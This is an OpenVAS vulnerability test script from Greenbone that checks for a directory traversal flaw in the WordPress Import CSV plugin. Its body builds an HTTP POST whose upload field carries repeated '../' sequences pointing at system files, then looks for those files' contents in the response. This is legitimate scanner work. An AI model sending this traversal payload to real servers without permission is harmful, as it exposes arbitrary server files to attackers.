###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Import CSV Directory Traversal Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807626");
  script_version("2023-03-01T10:20:05+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:05 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2016-04-12 18:40:48 +0530 (Tue, 12 Apr 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("WordPress Import CSV Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The WordPress plugin 'Import CSV' is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to read arbitrary files.");

  script_tag(name:"insight", value:"The flaw exists due to improper sanitization
  of 'url' parameter in 'upload-process.php' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files.");

  script_tag(name:"affected", value:"WordPress Import CSV plugin 1.0");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39576/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/xml-and-csv-import-in-article-content/upload-process.php";

useragent = http_get_user_agent();

files = traversal_files();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

foreach file (keys(files)) {

  postData = string('-----------------------------615182693467738782470537896\r\n',
                    'Content-Disposition: form-data; name="type"\r\n',
                    '\r\n',
                    'url\r\n',
                    '-----------------------------615182693467738782470537896\r\n',
                    'Content-Disposition: form-data; name="fichier"\r\n',
                    '\r\n',
                    crap(data: "../", length: 3*15) + files[file], '\r\n',
                    '-----------------------------615182693467738782470537896\r\n',
                    'Content-Disposition: form-data; name="submit"\r\n',
                    '\r\n',
                    'Submit Query\r\n');

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: multipart/form-data; boundary=---------------------------615182693467738782470537896\r\n",
               "Content-Length: ", strlen(postData), "\r\n\r\n",
               postData);
  res = http_keepalive_send_recv(port:port, data:req);

  if(egrep(string:res, pattern:file, icase:TRUE) &&
     res =~ "^HTTP/1\.[01] 200") {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
